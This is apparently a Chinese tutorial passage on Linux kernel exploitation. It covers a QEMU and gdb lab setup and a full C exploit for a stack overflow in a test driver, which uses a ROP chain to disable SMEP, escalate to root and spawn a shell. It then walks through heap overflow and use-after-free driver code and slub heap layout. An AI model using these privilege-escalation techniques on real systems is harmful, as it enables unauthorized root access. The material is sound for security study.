@@ -1,0 +1,242 @@
+    touch /etc/group
+    adduser hac425
+    insmod arbitrarily_write.ko
+    mknod /dev/arw c 248 0
+    chmod 777 /dev/arw 
+    cat /proc/modules
+> `mknod` 命令的参数根据实际情况进行修改
+为了方便对代码进行修改，写了个 `shell` 脚本，一件完成模块和测试代码的编译、 `rootfs.img` 的重打包 和 `qemu` 运行。
+`start.sh`
+    PWD=$(pwd)
+    make clean
+    sleep 0.5
+    make
+    sleep 0.5
+    rm ~/busybox-1.27.1/_install/{*.ko,test}
+    cp mknod.sh test *.ko ~/busybox-1.27.1/_install/
+    cd ~/busybox-1.27.1/_install/
+    rm ~/linux-4.1.1/rootfs.img
+    find . | cpio -o --format=newc > ~/linux-4.1.1/rootfs.img
+    cd $PWD
+    qemu-system-x86_64 -kernel ~/linux-4.1.1/arch/x86_64/boot/bzImage -initrd ~/linux-4.1.1/rootfs.img -append "console=ttyS0 root=/dev/ram rdinit=/sbin/init" -cpu kvm64,+smep --nographic -gdb tcp::1234
+然后 `./start.sh`，就可以运行起来了。
+进入系统后，首先使用 `mknod.sh` 安装模块，创建好设备文件等操作，然后切换到一个普通用户，执行 `test`
+测试驱动是否正常。对比源代码，可以判断驱动是正常运行的
+## gdb调试
+用 `qemu` 运行内核时，加了一个 `-gdb tcp::1234` 的参数， `qemu` 会在 `1234` 端口起一个 `gdb_server`
+，我们直接用 `gdb` 连上去即可。
+> 记得加载 `vmlinux` 文件，以便在调试的时候可以有调试符号。
+为了调试内核模块，还需要加载 驱动的 符号文件，首先在系统里面获取驱动的加载基地址。
+    / # cat /proc/modules | grep arb
+    arbitrarily_write 2168 0 - Live 0xffffffffa0000000 (O)
+    / #
+然后在 `gdb` 里面加载
+    gef➤  add-symbol-file ~/kernel/arbitrarily_write/arbitrarily_write.ko 0xffffffffa0000000
+    add symbol table from file "/home/haclh/kernel/arbitrarily_write/arbitrarily_write.ko" at
+        .text_addr = 0xffffffffa0000000
+    Reading symbols from /home/haclh/kernel/arbitrarily_write/arbitrarily_write.ko...done.
+    gef➤
+此时就可以直接对驱动的函数下断点了
+    b arw_ioctl
+然后运行测试程序 ( `test` )，就可以断下来了。
+# 利用方式汇总
+## 内核 Rop
+### Rop-By-栈溢出
+本节的相关文件位于 `kmod`
+#### 准备工作
+开始打算直接用
+    https://github.com/black-bunny/LinKern-x86_64-bypass-SMEP-KASLR-kptr_restric
+里面给的内核镜像，发现有些问题。于是自己编译了一个 `linux 4.4.72` 的镜像，然后自己那他的源码编译了驱动。
+默认编译驱动开了栈保护，懒得重新编译内核了，于是直接 在 驱动里面 patch 掉了 栈保护的检测代码。
+#### 漏洞
+漏洞位于 `vuln_write` 函数
+    static ssize_t vuln_write(struct file *f, const char __user *buf,size_t len, loff_t *off)
+    {
+      char buffer[100]={0};
+      if (_copy_from_user(buffer, buf, len))
+        return -EFAULT;
+      buffer[len-1]='\0';
+      printk("[i] Module vuln write: %s\n", buffer);
+      strncpy(buffer_var,buffer,len);
+      return len;
+    }
+可以看到 `_copy_from_user` 的参数都是我们控制的，然后把内容读入了栈中的 `buffer`， 简单的栈溢出。
+把驱动拖到 `ida` 里面，发现没有开启 `cancary` , 同时 `buffer` 距离 返回地址的 偏移为 `0x7c`
+所以只要读入超过 `0x7c` 个字节的数据就可以覆盖到 返回地址，控制 `rip`
+#### 利用
+如果没有开启任何保护的话，直接把返回地址改成用户态的 函数，然后调用
+    commit_creds(prepare_kernel_cred(0))
+就可以完成提权了。
+> 可以参考： [Linux内核漏洞利用（三）Kernel Stack Buffer Overflow](http://t.cn/RmXCzxS)
+秉着学习的态度，这里我开了 `smep` 。 这个安全选项的作用是禁止内核去执行 **用户空间的代码** 。
+但是我们依旧可以执行内核的代码 ，于是在内核 进行 **ROP** 。
+`ROP`的话有两种思路
+  1. 利用 `ROP` ，执行 `commit_creds(prepare_kernel_cred(0))` , 然后 `iret` 返回用户空间。
+  2. 利用 `ROP` 关闭 `smep` , 然后进行 `ret2user` 攻击。
+##### 利用 rop 直接提权
+此时布置的 `rop` 链 类似下面
+就是 调用 `commit_creds(prepare_kernel_cred(0))` , 然后 `iret` 返回到用户空间。
+**参考**
+[入门学习linux内核提权](https://xz.aliyun.com/t/2054#toc-9)
+##### 利用 rop 关闭 smep && ret2user
+系统根据 cr4 寄存器的值判断是否开启 smep， 然而 cr4 寄存器可以使用 mov 指令进行修改，于是事情就变得简单了，利用 `rop` 设置
+`cr4` 为 `0x6f0` （这个值可以通过用 `cr4原始值 & 0xFFFFF` 得到）， 然后 `iret` 到用户空间去执行提权代码。
+> 在 `gdb` 中貌似看不到 `cr4` 寄存器，可以从 内核的崩溃信息里面获取 开启 `smep` 下的 `cr4` 寄存器值
+`exp`:
+    #include 
+    #include 
+    #include 
+    #include 
+    typedef int __attribute__((regparm(3)))(*_commit_creds)(unsigned long cred);
+    typedef unsigned long __attribute__((regparm(3))) (*_prepare_kernel_cred)(unsigned long cred);
+    // 两个函数的地址
+    _commit_creds commit_creds = (_commit_creds) 0xffffffff810a1420;
+    _prepare_kernel_cred prepare_kernel_cred = (_prepare_kernel_cred) 0xffffffff810a1810;
+    unsigned long xchg_eax_esp = 0xFFFFFFFF81007808;
+    unsigned long rdi_to_cr4 = 0xFFFFFFFF810635B4; // mov cr4, rdi ;pop rbp ; ret
+    unsigned long pop_rdi_ret = 0xFFFFFFFF813E7D6F;
+    unsigned long iretq = 0xffffffff814e35ef;
+    unsigned long swapgs = 0xFFFFFFFF81063694;  // swapgs ; pop rbp ; ret
+    unsigned long poprbpret = 0xffffffff8100202b;  //pop rbp, ret
+    unsigned long mmap_base = 0xb0000000;
+    void get_shell() {
+        system("/bin/sh");
+    }
+    void get_root() {
+        commit_creds(prepare_kernel_cred(0));
+    }
+    /* status */
+    unsigned long user_cs, user_ss, user_rflags;
+    void save_stats() {
+        asm(
+            "movq %%cs, %0\n" // mov rcx, cs
+            "movq %%ss, %1\n" // mov rdx, ss
+            "pushfq\n"        // 把rflags的值压栈
+            "popq %2\n"       // pop rax
+            :"=r"(user_cs), "=r"(user_ss), "=r"(user_rflags) : : "memory" // mov user_cs, rcx; mov user_ss, rdx; mov user_flags, rax
+            );
+    }
+    int main(void)
+    {
+        int fd;
+        char buf[16];
+        fd = open("/dev/vuln", O_RDWR);
+        if (fd == -1) {
+            printf("open /dev/vuln device failed!\n");
+            return -1;
+        }
+        save_stats();
+        printf("mmap_addr: %p\n", mmap(mmap_base, 0x30000, 7, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0));
+        // 布局 rop 链
+        unsigned long rop_chain[] = {
+            pop_rdi_ret,
+            0x6f0,
+            rdi_to_cr4, // cr4 = 0x6f0
+            mmap_base + 0x10000,
+            (unsigned long)get_root,
+            swapgs, // swapgs; pop rbp; ret
+            mmap_base,   // rbp = base
+            iretq,
+            (unsigned long)get_shell,
+            user_cs,
+            user_rflags,
+            mmap_base + 0x10000,
+            user_ss
+        };
+        char * payload = malloc(0x7c + sizeof(rop_chain));
+        memset(payload, 0xf1, 0x7c + sizeof(rop_chain));
+        memcpy(payload + 0x7c, rop_chain, sizeof(rop_chain));
+        write(fd, payload, 0x7c + sizeof(rop_chain));
+        return 0;
+    }
+说说 rop 链
+  * 首先使用 `pop rdi && mov cr4,rdi` ，修改 `cr4`寄存器，关掉 `smep`
+  * 然后 `ret2user` 去执行用户空间的 `get_root` 函数，执行 `commit_creds(prepare_kernel_cred(0))` 完成提权
+  * 然后 `swapgs` 和 `iret` 返回用户空间，起一个 `root` 权限的 `shell` 。
+**参考**
+[Linux Kernel x86-64 bypass SMEP - KASLR -kptr_restric](http://blackbunny.io/linux-kernel-x86-64-bypass-smep-kaslr-kptr_restric/)
+### Rop-By-Heap-Vulnerability
+#### 漏洞
+首先放源码，位于 `heap_bof`
+驱动的代码基本差不多，区别点主要在 `ioctl` 处
+    char *ptr[40];  // 指针数组，用于存放分配的指针
+    struct param
+    {
+        size_t len;    // 内容长度
+        char* buf;     // 用户态缓冲区地址
+        unsigned long idx; // 表示 ptr 数组的 索引
+    };
+    ............................
+    ............................
+    ............................
+    long bof_ioctl(struct file *filp, unsigned int cmd, unsigned long arg)
+    {
+        struct param* p_arg;
+        p_arg = (struct param*)arg;
+        int retval = 0;
+        switch (cmd) {
+            case 9:
+                copy_to_user(p_arg->buf, ptr[p_arg->idx], p_arg->len);
+                printk("copy_to_user: 0x%x\n", *(long *)ptr[p_arg->idx]);
+                break;
+            case 8:
+                copy_from_user(ptr[p_arg->idx], p_arg->buf, p_arg->len);
+                break;
+            case 7:
+                kfree(ptr[p_arg->idx]);
+                printk("free: 0x%p\n", ptr[p_arg->idx]);
+                break;
+            case 5:
+                ptr[p_arg->idx] = kmalloc(p_arg->len, GFP_KERNEL);
+                printk("alloc: 0x%p, size: %2x\n", ptr[p_arg->idx], p_arg->len);
+                break;
+            default:
+                retval = -1;
+                break;
+        }
+        return retval;
+    }
+首先定义了一个 指针数组 `ptr[40]` ，用于存放 **分配的内存地址的指针** 。
+实现了驱动的 `ioctl` 接口来向用户态提供服务。
+  * `cmd` 为 `5` 时，根据参数调用 `kmalloc` 分配内存，然后把分配好的指针，存放在 `ptr[p_arg->idx]`, 为了调试的方便，打印了分配到的内存指针
+  * `cmd` 为 `7` 时，释放掉 `ptr` 数组中指定项的指针， **`kfree` 之后没有对 `ptr` 中的指定项置0**。
+  * `cmd` 为 `8` 时，往 `ptr` 数组中 指定项的指针中 **写入 数据，长度不限.**
+  * `cmd` 为 `9` 时， 获取 指定项 的指针 里面的 数据，然后拷贝到用户空间。
+驱动的漏洞还是很明显的， 堆溢出 以及 `UAF` .
+#### 利用
+##### slub简述
+要进行利用的话还需要了解 内核的内存分配策略。
+在 `linux` 内核 `2.26` 以上的版本，默认使用 `slub` 分配器进行内存管理。`slub`
+分配器按照零售式的内存分配。他会把大小相近的对象（分配的内存）放到同一个 `slab` 中进行分配。
+它首先向系统分配一个大的内存，然后把它分成大小相等的内存块进行内存的分配，同时在分配内存时会对分配的大小 向上取整分配。
+可以查看 `/proc/slabinfo` 获取当前系统 的 `slab` 信息
+这里介绍下 `kmalloc-xxx` ，这些 `slab` 用于给 `kmalloc` 进行内存分配。 假如要分配 `0x2e0` ，向上取整就是
+`kmalloc-1024` 所以实际会使用 `kmalloc-1024` 分配 `1024` 字节的内存块。
+而且 `slub` 分配内存不像 `glibc` 中的`malloc`， `slub` 分配的内存的首部是 **没有元数据**
+的（如果内存块处于释放状态的话会有一个指针，指向下一个 free 的块）。
+所以如果分配几个大小相同的内存块， 它们会紧密排在一起（不考虑内存碎片的情况）。
+给个例子（详细代码可以看最后的 `exp` )
+    struct param p;
+        p.len = 0x2e0;
+        p.buf = malloc(p.len);
+        for (int i = 0; i < 10; ++i)
+        {
+            p.idx = i;
+            ioctl(fds[i], 5, &p);  // malloc
+        }
+这一小段代码的作用是 通过 `ioctl` 让驱动调用`10` 次 `kmalloc(0x2e0, GFP_KERNEL)`，驱动打印出的
+**分配的地址** 如下
+    [    7.095323] alloc: 0xffff8800027ee800, size: 2e0
+    [    7.101074] alloc: 0xffff8800027ef000, size: 2e0
+    [    7.107161] alloc: 0xffff8800027ef400, size: 2e0
+    [    7.111211] alloc: 0xffff8800027ef800, size: 2e0
+    [    7.115165] alloc: 0xffff8800027efc00, size: 2e0
+    [    7.131237] alloc: 0xffff880002791c00, size: 2e0
+    [    7.138591] alloc: 0xffff880003604000, size: 2e0
+    [    7.141208] alloc: 0xffff880003604400, size: 2e0
+    [    7.146466] alloc: 0xffff880003604800, size: 2e0
+    [    7.154290] alloc: 0xffff880003604c00, size: 2e0
+可以看到除了第一个（内存碎片的原因），其他分配到的内存的地址相距都是 `0x400`, 这说明内核实际给我的空间是 `0x400` .
+尽管我们要分配的是 `0x2e0` ，实际内核会把大小向上取整 到 `0x400`
+**参考**
+[linux 内核 内存管理 slub算法 （一）
